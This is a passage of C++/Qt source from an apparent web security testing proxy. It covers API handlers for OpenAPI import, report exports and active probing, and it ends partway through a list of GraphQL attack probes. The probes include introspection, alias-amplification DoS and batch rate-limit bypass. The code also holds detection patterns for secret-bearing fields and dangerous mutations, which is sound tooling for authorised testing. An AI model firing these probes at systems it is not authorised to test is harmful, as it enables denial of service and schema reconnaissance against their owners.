        out += "## Captured surface\n\n";
        if (m_wiring.projectStore) {
            auto *idx = m_wiring.projectStore->historyIndex();
            const int total = idx ? idx->rowCount() : 0;
            out += "**Total captured requests:** " + QString::number(total) + "\n\n";
        }

        out += "## Methodology\n\n";
        out += "- Tool: Nullock (https://github.com/Bikebrainz/Nullock)\n";
        out += "- Passive scanner enabled throughout\n";
        out += "- Active probe applied to in-scope rows with query parameters\n";
        out += "- OAST callbacks monitored for blind SSRF / blind XSS / OOB-DNS\n\n";

        out += "---\n";
        out += "*Report auto-generated by Nullock. Review before distribution.*\n";

        QByteArray hdr;
        hdr += "HTTP/1.1 200 OK\r\n";
        hdr += "Content-Type: text/markdown; charset=utf-8\r\n";
        hdr += "Content-Disposition: attachment; filename=\"nullock-report.md\"\r\n";
        const QByteArray body = out.toUtf8();
        hdr += "Content-Length: " + QByteArray::number(body.size()) + "\r\n";
        hdr += "Connection: close\r\n\r\n";
        return hdr + body;
    }

    // ---- Built-in extensions install ---------------------------------
    // POST /api/extensions/install-builtins -- copies the extensions
    // shipped with the repo (extensions/*.js) into the user's
    // extensions dir. Removes the "go find the file in github and
    // copy it yourself" onboarding step.
    if (path == "/api/extensions/install-builtins") {
        if (!m_wiring.extensions)
            return okJson({{ "ok", false }, { "error", "no extensions wired" }});
        const QString destDir = m_wiring.extensions->extensionsDir();
        QDir().mkpath(destDir);
        // Walk our shipped extensions dir. We look for it relative to
        // uiDir (which already points at the repo's ui-v2) -- one level
        // up from there is the repo root, with extensions/ alongside.
        QString srcDir = m_wiring.uiDir + "/../extensions";
        if (!QFileInfo::exists(srcDir))
            srcDir = QCoreApplication::applicationDirPath() + "/../../../../extensions";
        if (!QFileInfo::exists(srcDir))
            return okJson({{ "ok", false }, { "error",
                "couldn't locate built-in extensions dir" }});
        QDir d(srcDir);
        const QStringList files = d.entryList({"*.js"}, QDir::Files);
        int installed = 0;
        for (const QString &f : files) {
            const QString src = d.absoluteFilePath(f);
            const QString dst = destDir + "/" + f;
            QFile::remove(dst);
            if (QFile::copy(src, dst)) ++installed;
        }
        if (m_wiring.extensions) m_wiring.extensions->reload();
        return okJson({{ "ok", true }, { "installed", installed },
                       { "destDir", destDir }});
    }

    // ---- OpenAPI / Swagger spec import -------------------------------
    // POST /api/openapi/import { spec: <JSON>, baseUrl?: "https://..." }
    // Walks paths + methods, emits one synthetic captured request per
    // operation. Lets the user see the full surface in history, fan any
    // operation out into the Repeater / Intruder, or auto-populate scope
    // from the servers list.
    if (path == "/api/openapi/import") {
        if (!m_wiring.projectStore)
            return okJson({{ "ok", false }, { "error", "no project store" }});

        QJsonValue specVal = bodyJson.value("spec");
        QJsonObject spec;
        if (specVal.isString()) {
            QJsonParseError jerr;
            const QJsonDocument d = QJsonDocument::fromJson(specVal.toString().toUtf8(), &jerr);
            if (jerr.error != QJsonParseError::NoError || !d.isObject())
                return okJson({{ "ok", false }, { "error",
                                                  "spec is not valid JSON: " + jerr.errorString() }});
            spec = d.object();
        } else if (specVal.isObject()) {
            spec = specVal.toObject();
        } else {
            return okJson({{ "ok", false }, { "error", "spec missing or wrong type" }});
        }

        // Decide base URL. Override > spec.servers[0].url > spec.host+basePath.
        QString baseUrlOverride = bodyJson.value("baseUrl").toString();
        QString baseUrl;
        if (!baseUrlOverride.isEmpty()) {
            baseUrl = baseUrlOverride;
        } else if (spec.contains("servers")) {
            const QJsonArray servers = spec.value("servers").toArray();
            if (!servers.isEmpty())
                baseUrl = servers.first().toObject().value("url").toString();
        } else if (spec.contains("host")) {
            const QString scheme = spec.value("schemes").toArray().isEmpty()
                ? QStringLiteral("https")
                : spec.value("schemes").toArray().first().toString("https");
            baseUrl = scheme + "://" + spec.value("host").toString()
                            + spec.value("basePath").toString();
        }
        if (baseUrl.isEmpty())
            return okJson({{ "ok", false }, { "error",
                                              "no base URL found (set baseUrl in body or include servers[]/host)" }});
        // Normalize: drop trailing slash so concatenation is clean.
        while (baseUrl.endsWith('/')) baseUrl.chop(1);

        const QUrl burl(baseUrl);
        const QString hostStr = burl.host();
        const bool useTls    = (burl.scheme().compare("https", Qt::CaseInsensitive) == 0);
        const int  portInt   = burl.port(useTls ? 443 : 80);

        const QJsonObject paths = spec.value("paths").toObject();
        int imported = 0;
        static const QStringList kMethods = {
            "get", "put", "post", "delete", "options", "head", "patch", "trace"
        };

        for (auto it = paths.constBegin(); it != paths.constEnd(); ++it) {
            const QString rawPath = it.key();
            const QJsonObject pathItem = it.value().toObject();
            // Path-level params would apply to every operation -- we don't
            // model them separately; per-op overrides them anyway.

            for (const QString &m : kMethods) {
                if (!pathItem.contains(m)) continue;
                const QJsonObject op = pathItem.value(m).toObject();

                // Substitute path templates {paramName} with the param's
                // example value (or "1" as a generic placeholder for the
                // path-param `userId`/`id` shape).
                QString finalPath = rawPath;
                const QJsonArray params = op.value("parameters").toArray();
                QHash<QString, QString> queryParams;
                QHash<QString, QString> headerParams;
                QString bodyJsonStr;
                QString bodyCT;
                for (const QJsonValue &pv : params) {
                    const QJsonObject p = pv.toObject();
                    const QString in   = p.value("in").toString();
                    const QString name = p.value("name").toString();
                    QString val = p.value("example").toVariant().toString();
                    if (val.isEmpty()) val = p.value("default").toVariant().toString();
                    if (val.isEmpty()) {
                        const QString type = p.value("schema").toObject().value("type").toString(
                                                p.value("type").toString());
                        if (type == "integer" || type == "number") val = "1";
                        else if (type == "boolean") val = "true";
                        else val = "{{" + name + "}}";  // ready for session-rules injection
                    }
                    if (in == "path") {
                        finalPath.replace("{" + name + "}", val);
                    } else if (in == "query") {
                        queryParams.insert(name, val);
                    } else if (in == "header") {
                        headerParams.insert(name, val);
                    } else if (in == "body") {
                        // OpenAPI v2 body parameter. The example can be
                        // an object, array, string, or number; handle
                        // them all rather than blindly toObject().
                        const QJsonValue ex = p.value("schema").toObject().value("example");
                        if (ex.isObject()) {
                            bodyJsonStr = QString::fromUtf8(
                                QJsonDocument(ex.toObject()).toJson(QJsonDocument::Compact));
                        } else if (ex.isArray()) {
                            bodyJsonStr = QString::fromUtf8(
                                QJsonDocument(ex.toArray()).toJson(QJsonDocument::Compact));
                        } else if (ex.isString()) {
                            bodyJsonStr = ex.toString();
                        } else if (ex.isDouble()) {
                            bodyJsonStr = QString::number(ex.toDouble());
                        } else if (ex.isBool()) {
                            bodyJsonStr = ex.toBool() ? "true" : "false";
                        }
                    }
                }
                // OpenAPI v3 requestBody
                if (op.contains("requestBody")) {
                    const QJsonObject rb = op.value("requestBody").toObject();
                    const QJsonObject content = rb.value("content").toObject();
                    for (auto cit = content.constBegin(); cit != content.constEnd(); ++cit) {
                        bodyCT = cit.key();
                        const QJsonObject example = cit.value().toObject().value("example").toObject();
                        if (!example.isEmpty()) {
                            bodyJsonStr = QString::fromUtf8(QJsonDocument(example).toJson(
                                                                QJsonDocument::Compact));
                        }
                        break;  // first content type wins
                    }
                }

                // Build full target path with query string.
                if (!queryParams.isEmpty()) {
                    QStringList parts;
                    for (auto qit = queryParams.cbegin(); qit != queryParams.cend(); ++qit) {
                        parts << (qit.key() + "="
                            + QString::fromUtf8(QUrl::toPercentEncoding(qit.value())));
                    }
                    finalPath += "?" + parts.join("&");
                }

                Nullock::Proxy::HttpRequest req;
                req.timestamp = QDateTime::currentDateTime();
                req.method      = m.toUpper();
                req.httpVersion = "HTTP/1.1";
                req.target      = finalPath;
                req.path        = finalPath;
                req.host        = hostStr;
                req.port        = static_cast<quint16>(portInt);
                req.headers.append({ "Host", hostStr });
                for (auto hit = headerParams.cbegin(); hit != headerParams.cend(); ++hit)
                    req.headers.append({ hit.key(), hit.value() });
                if (!bodyJsonStr.isEmpty()) {
                    req.headers.append({ "Content-Type",
                                         bodyCT.isEmpty() ? QString("application/json") : bodyCT });
                    req.body = bodyJsonStr.toUtf8();
                    req.headers.append({ "Content-Length",
                                         QString::number(req.body.size()) });
                }

                Nullock::Proxy::HttpResponse resp;
                resp.httpVersion  = "HTTP/1.1";
                resp.statusCode   = 0;
                resp.reasonPhrase = "OpenAPI imported (not yet sent)";
                resp.wasTls       = useTls;

                // appendEntry persists; entryLoaded signal updates the
                // GUI proxy model live.
                m_wiring.projectStore->appendEntry(req, resp);
                emit m_wiring.projectStore->entryLoaded(req, resp);
                ++imported;
            }
        }

        return okJson({
            { "ok",       true },
            { "imported", imported },
            { "host",     hostStr },
            { "baseUrl",  baseUrl },
        });
    }

    // ---- WebSocket Repeater ------------------------------------------
    // POST /api/ws/send { sessionId, direction: "up"|"down", opcode: 0-15, payload: str|null }
    // payload is interpreted as text for opcode 0x1, and as base64 for
    // 0x2 (binary). Other opcodes ignore payload.
    if (path == "/api/ws/send") {
        const qint64  sid  = bodyJson.value("sessionId").toVariant().toLongLong();
        const QString dir  = bodyJson.value("direction").toString();
        const int     op   = bodyJson.value("opcode").toInt(0x1);  // default text
        QByteArray payload;
        if (bodyJson.contains("payload")) {
            const QJsonValue v = bodyJson.value("payload");
            if (v.isString()) {
                if (op == 0x2) payload = QByteArray::fromBase64(v.toString().toLatin1());
                else           payload = v.toString().toUtf8();
            }
        }
        const bool ok = Nullock::Proxy::WsRepeater::instance()->sendFrame(
            sid, dir, op, payload);
        return okJson({{ "ok", ok }});
    }

    if (path == "/api/theme") {
        if (m_wiring.themes)
            m_wiring.themes->setCurrentTheme(bodyJson.value("name").toString());
        return okJson();
    }

    if (path == "/api/theme/save-as") {
        if (!m_wiring.themes) return okJson({{ "ok", false }});
        const QString name = bodyJson.value("name").toString();
        const QJsonObject colors = bodyJson.value("colors").toObject();
        QVariantMap colorMap;
        for (auto it = colors.constBegin(); it != colors.constEnd(); ++it)
            colorMap.insert(it.key(), it.value().toString());
        const bool ok = m_wiring.themes->saveTheme(name, colorMap);
        return okJson({
            { "saved", ok },
            { "current", m_wiring.themes->currentTheme() },
        });
    }

    if (path == "/api/theme/reload") {
        if (m_wiring.themes) m_wiring.themes->reload();
        return okJson();
    }

    if (path == "/api/har/export") {
        QString out;
        if (m_wiring.projectStore) {
            // Allow callers to override redaction with a body flag, but
            // default-on so a user clicking "Export HAR" doesn't have to
            // remember to opt into safety.
            const bool wasRedact = m_wiring.projectStore->exportRedact();
            if (bodyJson.contains("redact"))
                m_wiring.projectStore->setExportRedact(bodyJson.value("redact").toBool(true));
            out = m_wiring.projectStore->exportHar(QString());
            m_wiring.projectStore->setExportRedact(wasRedact);
        }
        return okJson({{ "path", out }});
    }
    if (path == "/api/har/import") {
        int n = -1;
        if (m_wiring.projectStore) {
            const QString p = bodyJson.value("path").toString();
            if (!p.isEmpty()) {
                n = m_wiring.projectStore->importHar(p);
            } else if (bodyJson.contains("har")) {
                // Caller posted the raw HAR object instead of a path.
                const QByteArray bytes =
                    QJsonDocument(bodyJson.value("har").toObject()).toJson(QJsonDocument::Compact);
                n = m_wiring.projectStore->importHarBytes(bytes);
            }
        }
        return okJson({
            { "imported", n },
            { "ok", n >= 0 },
        });
    }

    if (path == "/api/clear-history") {
        if (m_wiring.history) m_wiring.history->clear();
        return okJson();
    }

    if (path == "/api/mitm/clear-blocked") {
        if (m_wiring.proxy) m_wiring.proxy->clearMitmBlocked();
        return okJson();
    }

    if (path == "/api/extensions/reload") {
        if (m_wiring.extensions) m_wiring.extensions->reload();
        return okJson({{ "loaded", m_wiring.extensions ? m_wiring.extensions->loadedCount() : 0 }});
    }

    if (path == "/api/findings/clear") {
        if (m_wiring.scanner) m_wiring.scanner->clear();
        return okJson();
    }

    // ---- tool-integration exports ------------------------------------
    // GET /api/export/nmap-xml  -> port scan results as nmap-compatible XML
    if (path == "/api/export/nmap-xml") {
        if (!m_wiring.portScanner)
            return httpResponse(404, "text/plain", "no port scanner");
        QByteArray xml;
        xml += "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
        xml += "<!DOCTYPE nmaprun>\n";
        xml += "<?xml-stylesheet href=\"https://nmap.org/svn/docs/nmap.xsl\" type=\"text/xsl\"?>\n";
        xml += "<nmaprun scanner=\"nullock\" args=\"nullock --port-scan\" "
               "start=\"" + QByteArray::number(QDateTime::currentSecsSinceEpoch()) + "\" "
               "version=\"" + "1.0" + "\" "
               "xmloutputversion=\"1.05\">\n";
        // Group results by host so the XML is nmap-shaped.
        QMap<QString, QList<Nullock::Core::PortResult>> byHost;
        for (const auto &r : m_wiring.portScanner->results())
            byHost[r.host].append(r);
        auto xmlEscape = [](const QString &s) {
            // Replace control chars first so they don't survive as raw
            // bytes inside an attribute -- many XML parsers reject CR/LF
            // in attribute values (or silently mangle them).
            QString cleaned;
            cleaned.reserve(s.size());
            for (QChar c : s) {
                const ushort u = c.unicode();
                if (u == '\n' || u == '\r' || u == '\t') cleaned.append(' ');
                else if (u < 0x20) cleaned.append(' ');
                else cleaned.append(c);
            }
            return cleaned.toUtf8()
                    .replace('&', "&amp;").replace('<', "&lt;")
                    .replace('>', "&gt;").replace('"', "&quot;")
                    .replace('\'', "&apos;");
        };
        for (auto it = byHost.constBegin(); it != byHost.constEnd(); ++it) {
            const QString host = it.key();
            xml += "  <host>\n";
            xml += "    <address addr=\"" + xmlEscape(host) + "\" addrtype=\"ipv4\"/>\n";
            // <hostnames> if the input was a name not an IP -- best effort.
            if (!host.isEmpty() && !host[0].isDigit())
                xml += "    <hostnames><hostname name=\"" + xmlEscape(host)
                     + "\" type=\"user\"/></hostnames>\n";
            xml += "    <ports>\n";
            for (const auto &r : it.value()) {
                xml += "      <port protocol=\"tcp\" portid=\""
                     + QByteArray::number(r.port) + "\">\n";
                xml += "        <state state=\"" + xmlEscape(r.status)
                     + "\" reason=\"" + (r.status == "open" ? "syn-ack"
                                       : r.status == "closed" ? "conn-refused"
                                       : "no-response") + "\"/>\n";
                if (!r.service.isEmpty()) {
                    xml += "        <service name=\"" + xmlEscape(r.service) + "\"";
                    if (!r.banner.isEmpty())
                        xml += " banner=\"" + xmlEscape(r.banner.left(80)) + "\"";
                    xml += "/>\n";
                }
                xml += "      </port>\n";
            }
            xml += "    </ports>\n";
            xml += "  </host>\n";
        }
        xml += "  <runstats>\n";
        xml += "    <finished time=\"" + QByteArray::number(QDateTime::currentSecsSinceEpoch())
             + "\" elapsed=\"0\"/>\n";
        xml += "    <hosts up=\"" + QByteArray::number(byHost.size())
             + "\" down=\"0\" total=\"" + QByteArray::number(byHost.size()) + "\"/>\n";
        xml += "  </runstats>\n";
        xml += "</nmaprun>\n";
        return httpResponse(200, "application/xml; charset=utf-8", xml);
    }

    // GET /api/export/sarif  -> findings as SARIF v2 (CI-friendly)
    if (path == "/api/export/sarif") {
        if (!m_wiring.scanner)
            return httpResponse(404, "application/json", "{}");
        QJsonObject root;
        root["$schema"] = "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0.json";
        root["version"] = "2.1.0";
        QJsonObject driver;
        driver["name"]   = "Nullock";
        driver["informationUri"] = "https://github.com/Gratonic/Nullock";
        QJsonArray rules;
        // Collect unique kinds to populate the rules array.
        QSet<QString> seenKinds;
        for (const auto &f : m_wiring.scanner->findings(1000)) {
            if (seenKinds.contains(f.kind)) continue;
            seenKinds.insert(f.kind);
            QJsonObject rule;
            rule["id"] = f.kind;
            QJsonObject shortDesc;
            shortDesc["text"] = f.kind;
            rule["shortDescription"] = shortDesc;
            rules.append(rule);
        }
        driver["rules"] = rules;
        QJsonObject tool;
        tool["driver"] = driver;
        QJsonObject run;
        run["tool"] = tool;
        QJsonArray results;
        for (const auto &f : m_wiring.scanner->findings(1000)) {
            QJsonObject result;
            result["ruleId"] = f.kind;
            QString sarifLevel = "warning";
            if (f.severity == "high")   sarifLevel = "error";
            if (f.severity == "low")    sarifLevel = "note";
            if (f.severity == "info")   sarifLevel = "note";
            result["level"]  = sarifLevel;
            QJsonObject msg;
            msg["text"] = f.summary + (f.evidence.isEmpty() ? QString() : "\n\n" + f.evidence);
            result["message"] = msg;
            QJsonArray locations;
            QJsonObject location;
            QJsonObject physical;
            QJsonObject artifact;
            artifact["uri"] = f.url;
            physical["artifactLocation"] = artifact;
            location["physicalLocation"] = physical;
            locations.append(location);
            result["locations"] = locations;
            results.append(result);
        }
        run["results"] = results;
        QJsonArray runs; runs.append(run);
        root["runs"] = runs;
        return httpResponse(200, "application/sarif+json; charset=utf-8",
                            QJsonDocument(root).toJson(QJsonDocument::Indented));
    }

    // GET /api/export/postman  -> current history as a Postman collection
    // ?raw=1 disables the sensitive-header redaction (default-on so a
    // user sharing this with another human doesn't accidentally ship
    // their session cookies).
    if (path == "/api/export/postman") {
        if (!m_wiring.history)
            return httpResponse(404, "application/json", "{}");
        bool redact = true;
        {
            const QUrlQuery q(query);
            if (q.queryItemValue("raw") == "1") redact = false;
        }
        // Mirror project_store.cpp::isSensitiveHeader -- same set, kept
        // in sync deliberately so a single header policy covers all
        // export paths.
        static const QSet<QString> kSensitive = {
            "authorization", "proxy-authorization", "cookie", "set-cookie",
            "x-api-key", "x-auth-token", "x-csrf-token", "x-xsrf-token",
            "x-session-id", "x-amz-security-token",
            "x-goog-iam-authorization-token",
        };
        QJsonObject info;
        info["name"] = m_wiring.projectStore
                          ? "Nullock · " + m_wiring.projectStore->metadata().name
                          : QString("Nullock export");
        info["schema"] = "https://schema.getpostman.com/json/collection/v2.1.0/collection.json";
        QJsonArray items;
        // Iterate by id via HistoryIndex when available so exports cover
        // the full captured history, not just the in-memory window.
        // Falls back to the windowed model when SQLite isn't open.
        QList<int> ids;
        auto *fullIdx = m_wiring.projectStore
                            ? m_wiring.projectStore->historyIndex()
                            : nullptr;
        if (fullIdx && fullIdx->isOpen()) {
            ids = fullIdx->allIds();
        } else {
            const int n = m_wiring.history->rowCount();
            for (int i = 0; i < n; ++i) {
                const auto *r = m_wiring.history->requestAt(i);
                if (r) ids.append(m_wiring.history->firstId() + i);
            }
        }
        Nullock::Proxy::HttpRequest  scratchReq;
        Nullock::Proxy::HttpResponse scratchResp;
        for (int id : ids) {
            const Nullock::Proxy::HttpRequest  *req  = m_wiring.history->requestById(id);
            const Nullock::Proxy::HttpResponse *resp = m_wiring.history->responseById(id);
            if (!req && fullIdx && fullIdx->isOpen()) {
                auto fr = fullIdx->loadFullRow(id);
                if (fr.ok) {
                    scratchReq  = std::move(fr.request);
                    scratchResp = std::move(fr.response);
                    req  = &scratchReq;
                    resp = &scratchResp;
                }
            }
            if (!req) continue;
            if (req->method.startsWith("WS")) continue;
            QJsonObject item;
            item["name"] = req->method + " " + req->path;
            QJsonObject requestObj;
            requestObj["method"] = req->method;
            QJsonArray hdrs;
            for (const auto &h : req->headers) {
                const QString k = h.first;
                const QString lc = k.toLower();
                if (lc == "host" || lc == "content-length" || lc == "proxy-connection") continue;
                QJsonObject hh;
                hh["key"] = k;
                if (redact && kSensitive.contains(lc)) {
                    hh["value"] = QString("<redacted: %1 chars>").arg(h.second.size());
                } else {
                    hh["value"] = h.second;
                }
                hdrs.append(hh);
            }
            requestObj["header"] = hdrs;
            if (!req->body.isEmpty()) {
                QJsonObject body;
                body["mode"] = "raw";
                body["raw"]  = QString::fromUtf8(req->body);
                requestObj["body"] = body;
            }
            const bool tls = resp ? resp->wasTls : false;
            const QString proto = tls ? "https" : "http";
            const int defaultPort = tls ? 443 : 80;
            const QString port = (req->port == defaultPort)
                                 ? QString() : ":" + QString::number(req->port);
            QJsonObject url;
            url["raw"] = proto + "://" + req->host + port + req->path;
            requestObj["url"] = url;
            item["request"] = requestObj;
            items.append(item);
        }
        QJsonObject root;
        root["info"] = info;
        root["item"] = items;
        return httpResponse(200, "application/json; charset=utf-8",
                            QJsonDocument(root).toJson(QJsonDocument::Indented));
    }

    // POST /api/probe/all  { throttleMs?: 200, limit?: 50 }
    // Walks every history row that has query-string params and fires the
    // same active probe pipeline. Defaults to 200ms throttle so a casual
    // user doesn't accidentally DoS a target.
    if (path == "/api/probe/all") {
        if (!m_wiring.history || !m_wiring.proxy)
            return okJson({{ "ok", false }});
        const int throttleMs = bodyJson.value("throttleMs").toInt(200);
        const int limit      = bodyJson.value("limit").toInt(50);
        QList<int> rowIds;
        const int rc = m_wiring.history->rowCount();
        for (int i = rc - 1; i >= 0 && rowIds.size() < limit; --i) {
            const auto *r = m_wiring.history->requestAt(i);
            if (!r) continue;
            if (r->method.startsWith("WS")) continue;
            const int q = r->path.indexOf('?');
            if (q < 0) continue;
            const QString query = r->path.mid(q + 1);
            if (query.isEmpty()) continue;
            rowIds.append(i + 1);  // 1-based ids match snapshot rows
        }
        if (rowIds.isEmpty()) return okJson({{ "queued", 0 }});

        // Fire probes serially with throttle, off-thread so the response
        // returns immediately and the snapshot poll surfaces findings as
        // they land. We post synthetic POSTs to our own /probe endpoint
        // rather than duplicating the inner probe loop -- that way any
        // future improvements to the probe pipeline get picked up here
        // for free.
        const quint16 myPort = this->listeningPort();
        (void)QtConcurrent::run([myPort, rowIds, throttleMs]() {
            for (int rowId : rowIds) {
                QTcpSocket sock;
                sock.connectToHost(QHostAddress::LocalHost, myPort);
                if (!sock.waitForConnected(2000)) continue;
                const QByteArray req =
                    "POST /api/history/" + QByteArray::number(rowId) +
                    "/probe HTTP/1.1\r\n"
                    "Host: 127.0.0.1\r\n"
                    "Content-Length: 0\r\n"
                    "Connection: close\r\n\r\n";
                sock.write(req);
                sock.waitForBytesWritten(1000);
                sock.waitForReadyRead(1000);
                sock.disconnectFromHost();
                if (throttleMs > 0) QThread::msleep(static_cast<unsigned long>(throttleMs));
            }
        });
        return okJson({{ "queued", rowIds.size() }});
    }

    // ---- GraphQL active probe ----------------------------------------
    // POST /api/graphql/probe  { url, headers?: {Name: Value, ...} }
    //
    // Fires five distinct GraphQL attack probes against the target and
    // emits one finding per real hit. Burp Pro has a separate add-on
    // ($ extra) for this; we ship it native.
    //
    // Probes:
    //   1. Introspection enabled — fires the standard __schema query and
    //      flags if the server returns schema data in production.
    //   2. Field suggestion leak — sends a deliberate typo; if the
    //      response includes "Did you mean ...?" the server is leaking
    //      schema fragments even with introspection off.
    //   3. Alias-based amplification — fires 100 identical aliased
    //      fields in one query; if the server accepts it the endpoint
    //      lacks alias-count limits and is exposed to query-amplification
    //      DoS / auth-rate-limit bypass.
    //   4. Query-depth bypass — fires a nested query 10 levels deep; if
    //      accepted, depth limits are missing.
    //   5. Batched-query bypass — fires [{q1}, {q2}, ...] array form; if
    //      the server processes both, rate limiting can be batch-bypassed.
    // ---- GraphQL schema analysis -------------------------------------
    // POST /api/graphql/schema { url, headers? }
    //   When introspection is on, fetch the schema and analyse it for the
    //   attack surface Burp doesn't: dangerous mutations (delete/grant/
    //   impersonate/...) and sensitive fields (password/token/ssn/...).
    if (path == "/api/graphql/schema") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});
        const QString host = u.host();
        const int port = u.port(u.scheme() == "https" ? 443 : 80);
        const bool tls = (u.scheme() == "https");
        const QString gpath = u.path(QUrl::FullyEncoded).isEmpty()
                              ? QStringLiteral("/graphql") : u.path(QUrl::FullyEncoded);

        // Minimal introspection: type names + their fields, and which type
        // is the mutation root.
        const QByteArray q =
            R"({"query":"query{__schema{mutationType{name} queryType{name} types{name kind fields{name}}}}"})";
        QByteArray req;
        req  = "POST " + gpath.toUtf8() + " HTTP/1.1\r\n";
        req += "Host: " + host.toUtf8() + "\r\n";
        req += "User-Agent: Nullock/graphql-schema\r\n";
        req += "Content-Type: application/json\r\nAccept: application/json\r\n";
        req += "Accept-Encoding: identity\r\n";
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it) {
            // Reject CR/LF in header name/value -- it would split the request.
            const QString k = it.key(), v = it.value().toString();
            if (k.contains('\r') || k.contains('\n') || v.contains('\r') || v.contains('\n'))
                continue;
            req += k.toUtf8() + ": " + v.toUtf8() + "\r\n";
        }
        req += "Content-Length: " + QByteArray::number(q.size()) + "\r\n";
        req += "Connection: close\r\n\r\n";
        req += q;

        Nullock::Core::HttpClient client;
        const auto res = client.send(host, static_cast<quint16>(port), tls, req);
        if (!res.ok)
            return okJson({{ "ok", false }, { "error", "request failed: " + res.errorMessage }});
        // Cap the body we parse so a hostile endpoint can't OOM us.
        constexpr int kMaxSchema = 16 * 1024 * 1024;
        QJsonParseError jerr;
        const QJsonDocument doc = QJsonDocument::fromJson(res.parsed.body.left(kMaxSchema), &jerr);
        if (jerr.error != QJsonParseError::NoError || !doc.isObject())
            return okJson({{ "ok", true }, { "introspectionEnabled", false },
                           { "note", "response is not a JSON object (WAF/error page?) -- introspection state unknown" }});
        const QJsonObject root = doc.object();
        const QJsonObject schema = root.value("data").toObject().value("__schema").toObject();
        if (schema.isEmpty()) {
            const bool hadErrors = root.contains("errors");
            return okJson({{ "ok", true }, { "introspectionEnabled", false },
                           { "note", hadErrors
                               ? "introspection disabled (server returned a GraphQL error)"
                               : "no __schema in response -- introspection likely disabled" }});
        }

        // Empty mutationTypeName (no mutations) must NOT match a type whose
        // name happens to be empty -- guard explicitly.
        const QString mutationTypeName = schema.value("mutationType").toObject().value("name").toString();
        static const QRegularExpression dangerousRx(
            R"(^(delete|remove|destroy|drop|purge|wipe|grant|revoke|setRole|set_role|makeAdmin|promote|impersonate|assumeIdentity|resetPassword|reset_password|disable|ban|deactivate|transfer|refund|approve|override)\w*)",
            QRegularExpression::CaseInsensitiveOption);
        // A field is sensitive if its (lower-cased) name contains any of
        // these tokens -- catches userPassword / stripeApiKey / hashedToken,
        // not just names that start with the token.
        static const QStringList sensitiveTokens = {
            "password", "passwd", "secret", "token", "apikey", "accesstoken",
            "refreshtoken", "privatekey", "ssn", "socialsecurity", "creditcard",
            "cardnumber", "cvv", "mfasecret", "recoverycode",
        };
        // The token must sit on a name boundary -- at the start, after a
        // '_', or at a camelCase hump -- and end the same way, so 'password'
        // in userPassword / x_ssn / apiKeyList matches but 'token' inside
        // 'tokenize' (lowercase continuation) doesn't.
        auto isSensitive = [&](const QString &fn) {
            const QString l = fn.toLower();
            for (const QString &tok : sensitiveTokens) {
                int idx = l.indexOf(tok);
                while (idx >= 0) {
                    const int after = idx + tok.size();
                    const bool boundBefore = idx == 0 || l[idx - 1] == '_'
                        || fn[idx].isUpper();
                    const bool boundAfter = after >= l.size() || l[after] == '_'
                        || fn[after].isUpper() || fn[after].isDigit();
                    if (boundBefore && boundAfter) return true;
                    idx = l.indexOf(tok, idx + 1);
                }
            }
            return false;
        };

        QJsonArray dangerousMutations, sensitiveFields;
        int typeCount = 0, fieldCount = 0;
        constexpr int kMaxList = 200;   // bound the returned arrays
        for (const QJsonValue &tv : schema.value("types").toArray()) {
            const QJsonObject type = tv.toObject();
            const QString typeName = type.value("name").toString();
            if (typeName.isEmpty() || typeName.startsWith("__")) continue;
            ++typeCount;
            const bool isMutationType = !mutationTypeName.isEmpty() && typeName == mutationTypeName;
            for (const QJsonValue &fv : type.value("fields").toArray()) {
                const QString fn = fv.toObject().value("name").toString();
                if (fn.isEmpty()) continue;
                ++fieldCount;
                if (isMutationType && dangerousMutations.size() < kMaxList
                    && dangerousRx.match(fn).hasMatch())
                    dangerousMutations.append(fn);
                if (sensitiveFields.size() < kMaxList && isSensitive(fn))
                    sensitiveFields.append(QString("%1.%2").arg(typeName, fn));
            }
        }

        if (m_wiring.scanner) {
            m_wiring.scanner->reportFinding(0, "low", "graphql-introspection-active",
                "GraphQL introspection enabled -- full schema readable",
                QString("%1 types, %2 fields exposed").arg(typeCount).arg(fieldCount),
                host, url);
            if (!dangerousMutations.isEmpty()) {
                QStringList ms; for (const auto &v : dangerousMutations) ms << v.toString();
                m_wiring.scanner->reportFinding(0, "medium", "graphql-dangerous-mutation",
                    "GraphQL exposes state-changing mutations: " + ms.join(", "),
                    "review authorization on each", host, url);
            }
            if (!sensitiveFields.isEmpty()) {
                QStringList fs; for (const auto &v : sensitiveFields) fs << v.toString();
                m_wiring.scanner->reportFinding(0, "medium", "graphql-sensitive-field",
                    "GraphQL schema exposes sensitive field(s): " + fs.mid(0, 10).join(", "),
                    "ensure these are never returned to unauthorized callers", host, url);
            }
        }
        return okJson({{ "ok", true }, { "introspectionEnabled", true },
                       { "types", typeCount }, { "fields", fieldCount },
                       { "mutationType", mutationTypeName },
                       { "dangerousMutations", dangerousMutations },
                       { "sensitiveFields", sensitiveFields }});
    }

    if (path == "/api/graphql/probe") {
        if (!m_wiring.scanner)
            return okJson({{ "ok", false }, { "error", "no scanner" }});
        const QString url = bodyJson.value("url").toString();
        if (url.isEmpty())
            return okJson({{ "ok", false }, { "error", "url required" }});
        const QUrl u(url);
        if (!u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "invalid url" }});
        const QJsonObject extraHeaders = bodyJson.value("headers").toObject();

        // Build probe queries up front; pure data so we can fan them out.
        struct Probe {
            QByteArray name;
            QByteArray queryJson;
            QByteArray expectMarker;     // substring -> "fired" finding
            QByteArray missMarker;       // substring -> "negative" (no finding)
            const char *severity;
            const char *kind;
            const char *summary;
            const char *fixHint;
        };
        const QList<Probe> probes = {
            {
                "introspection",
                R"({"query":"{__schema{types{name}}}"})",
                "\"__schema\"", "",
                "medium", "graphql-introspection-active",
                "GraphQL introspection enabled in production",
                "disable introspection or restrict to dev environments",
            },
            {
                "field-suggestion",
                R"({"query":"{ usrr { id } }"})",
                "Did you mean",   "",
                "low", "graphql-field-suggestion",
                "GraphQL leaks schema via field suggestions",
                "set NoSchemaIntrospectionCustomRule or disable suggestions",
            },
            {
                "alias-amplification",
                // 100 aliased __typename calls -- cheap to assemble,
                // expensive for the server if there's no alias cap.
                {},  // built below
                "\"data\"", "",
                "high", "graphql-alias-amplification",
                "GraphQL accepts 100+ aliased fields in one query",
                "set max-alias-count or enforce query-cost limits",
            },
            {
                "depth-bypass",
